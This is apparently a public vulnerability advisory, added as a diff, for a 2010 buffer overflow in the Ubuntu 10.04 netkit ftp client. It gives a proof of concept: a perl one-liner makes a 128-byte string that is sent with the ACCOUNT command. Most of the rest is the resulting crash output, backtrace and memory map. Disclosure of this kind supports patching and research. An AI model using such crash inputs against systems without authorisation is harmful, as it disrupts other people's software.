@@ -1,0 +1,104 @@
+#Exploit Title:		Ubuntu 10.04 LTS - Lucid Lynx ftp Client v0.17-19build1 ACCT Buffer Overflow
+#Date:			23/07/2010 
+#Author:		d0lc3		d0lc3x[at]gmail[dom]com
+#Software Link:		http://packages.ubuntu.com/	
+#Version:		0.17-19build1
+#Tested on:		Linux ubuntu32 2.6.32-23-generic x64 
+#Summary:
+
+Packet: ftp
+Version: 0.17-19build1
+Description: FTP Client
+
+	ftp is user interface ( in Ubuntu Lucid by default ) for FTP protocol. Tool to allows users to transfer files to/from host on Internet.
+
+	When we start one ftp conection to remote host using this client version, after login, performing ACCT command with long string like first argument (128 bytes) we will get Buffer Overflow crash:
+
+~$ ftp 192.168.0.69
+...
+Connected to 192.168.0.69.
+220 
+Name (192.168.0.29:hacker): anonymous
+Password:
+230 User logged in, proceed.
+Remote system type is WIN32.
+
+...
+~$ perl -e 'print"a"x128 ."\n";'
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaa
+...
+
+ftp> ACCOUNT aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaa
+*** buffer overflow detected ***: ftp terminated
+======= Backtrace: =========
+/lib/libc.so.6(__fortify_fail+0x37)[0x7f8cb258b207]
+/lib/libc.so.6(+0xfe0c0)[0x7f8cb258a0c0]
+/lib/libc.so.6(+0xfd204)[0x7f8cb2589204]
+ftp[0x403f79]
+ftp[0x40e2d8]
+/lib/libc.so.6(__libc_start_main+0xfd)[0x7f8cb24aac4d]
+ftp[0x402799]
+======= Memory map: ========
+00400000-00413000 r-xp 00000000 08:01 7078877                            /usr/bin/netkit-ftp
+00612000-00613000 r--p 00012000 08:01 7078877                            /usr/bin/netkit-ftp
+00613000-00615000 rw-p 00013000 08:01 7078877                            /usr/bin/netkit-ftp
+00615000-00622000 rw-p 00000000 00:00 0 
+00f34000-00f76000 rw-p 00000000 00:00 0                                  [heap]
+7f8cb1836000-7f8cb184c000 r-xp 00000000 08:01 3932394                    /lib/libgcc_s.so.1
+7f8cb184c000-7f8cb1a4b000 ---p 00016000 08:01 3932394                    /lib/libgcc_s.so.1
+7f8cb1a4b000-7f8cb1a4c000 r--p 00015000 08:01 3932394                    /lib/libgcc_s.so.1
+7f8cb1a4c000-7f8cb1a4d000 rw-p 00016000 08:01 3932394                    /lib/libgcc_s.so.1
+7f8cb1a4d000-7f8cb1a57000 r-xp 00000000 08:01 3932628                    /lib/libnss_nis-2.11.1.so
+7f8cb1a57000-7f8cb1c56000 ---p 0000a000 08:01 3932628                    /lib/libnss_nis-2.11.1.so
+7f8cb1c56000-7f8cb1c57000 r--p 00009000 08:01 3932628                    /lib/libnss_nis-2.11.1.so
+7f8cb1c57000-7f8cb1c58000 rw-p 0000a000 08:01 3932628                    /lib/libnss_nis-2.11.1.so
+7f8cb1c58000-7f8cb1c6f000 r-xp 00000000 08:01 3932623                    /lib/libnsl-2.11.1.so
+7f8cb1c6f000-7f8cb1e6e000 ---p 00017000 08:01 3932623                    /lib/libnsl-2.11.1.so
+7f8cb1e6e000-7f8cb1e6f000 r--p 00016000 08:01 3932623                    /lib/libnsl-2.11.1.so
+7f8cb1e6f000-7f8cb1e70000 rw-p 00017000 08:01 3932623                    /lib/libnsl-2.11.1.so
+7f8cb1e70000-7f8cb1e72000 rw-p 00000000 00:00 0 
+7f8cb1e72000-7f8cb1e7a000 r-xp 00000000 08:01 3932624                    /lib/libnss_compat-2.11.1.so
+7f8cb1e7a000-7f8cb2079000 ---p 00008000 08:01 3932624                    /lib/libnss_compat-2.11.1.so
+7f8cb2079000-7f8cb207a000 r--p 00007000 08:01 3932624                    /lib/libnss_compat-2.11.1.so
+7f8cb207a000-7f8cb207b000 rw-p 00008000 08:01 3932624                    /lib/libnss_compat-2.11.1.so
+7f8cb207b000-7f8cb2087000 r-xp 00000000 08:01 3932626                    /lib/libnss_files-2.11.1.so
+7f8cb2087000-7f8cb2286000 ---p 0000c000 08:01 3932626                    /lib/libnss_files-2.11.1.so
+7f8cb2286000-7f8cb2287000 r--p 0000b000 08:01 3932626                    /lib/libnss_files-2.11.1.so
+7f8cb2287000-7f8cb2288000 rw-p 0000c000 08:01 3932626                    /lib/libnss_files-2.11.1.so
+7f8cb2288000-7f8cb228a000 r-xp 00000000 08:01 3932620                    /lib/libdl-2.11.1.so
+7f8cb228a000-7f8cb248a000 ---p 00002000 08:01 3932620                    /lib/libdl-2.11.1.so
+7f8cb248a000-7f8cb248b000 r--p 00002000 08:01 3932620                    /lib/libdl-2.11.1.so
+7f8cb248b000-7f8cb248c000 rw-p 00003000 08:01 3932620                    /lib/libdl-2.11.1.so
+7f8cb248c000-7f8cb2606000 r-xp 00000000 08:01 3932617                    /lib/libc-2.11.1.so
+7f8cb2606000-7f8cb2805000 ---p 0017a000 08:01 3932617                    /lib/libc-2.11.1.so
+7f8cb2805000-7f8cb2809000 r--p 00179000 08:01 3932617                    /lib/libc-2.11.1.so
+7f8cb2809000-7f8cb280a000 rw-p 0017d000 08:01 3932617                    /lib/libc-2.11.1.so
+7f8cb280a000-7f8cb280f000 rw-p 00000000 00:00 0 
+7f8cb280f000-7f8cb284d000 r-xp 00000000 08:01 3932413                    /lib/libncurses.so.5.7
+7f8cb284d000-7f8cb2a4d000 ---p 0003e000 08:01 3932413                    /lib/libncurses.so.5.7
+7f8cb2a4d000-7f8cb2a51000 r--p 0003e000 08:01 3932413                    /lib/libncurses.so.5.7
+7f8cb2a51000-7f8cb2a52000 rw-p 00042000 08:01 3932413                    /lib/libncurses.so.5.7
+7f8cb2a52000-7f8cb2a8b000 r-xp 00000000 08:01 3932471                    /lib/libreadline.so.6.1
+7f8cb2a8b000-7f8cb2c8a000 ---p 00039000 08:01 3932471                    /lib/libreadline.so.6.1
+7f8cb2c8a000-7f8cb2c8c000 r--p 00038000 08:01 3932471                    /lib/libreadline.so.6.1
+7f8cb2c8c000-7f8cb2c92000 rw-p 0003a000 08:01 3932471                    /lib/libreadline.so.6.1
+7f8cb2c92000-7f8cb2c93000 rw-p 00000000 00:00 0 
+7f8cb2c93000-7f8cb2cb3000 r-xp 00000000 08:01 3932614                    /lib/ld-2.11.1.so
+7f8cb2e4c000-7f8cb2e8b000 r--p 00000000 08:01 7085908                    /usr/lib/locale/es_ES.utf8/LC_CTYPE
+7f8cb2e8b000-7f8cb2e8f000 rw-p 00000000 00:00 0 
+7f8cb2ea6000-7f8cb2ead000 r--s 00000000 08:01 7089467                    /usr/lib/gconv/gconv-modules.cache
+7f8cb2ead000-7f8cb2eb3000 rw-p 00000000 00:00 0 
+7f8cb2eb3000-7f8cb2eb4000 r--p 00020000 08:01 3932614                    /lib/ld-2.11.1.so
+7f8cb2eb4000-7f8cb2eb5000 rw-p 00021000 08:01 3932614                    /lib/ld-2.11.1.so
+7f8cb2eb5000-7f8cb2eb6000 rw-p 00000000 00:00 0 
+7fffceac1000-7fffcead6000 rw-p 00000000 00:00 0                          [stack]
+7fffceb8e000-7fffceb8f000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+Cancel
+
+
+greetz to: Chip d3 Bi0s & Devil ro0t
+
+by r0i
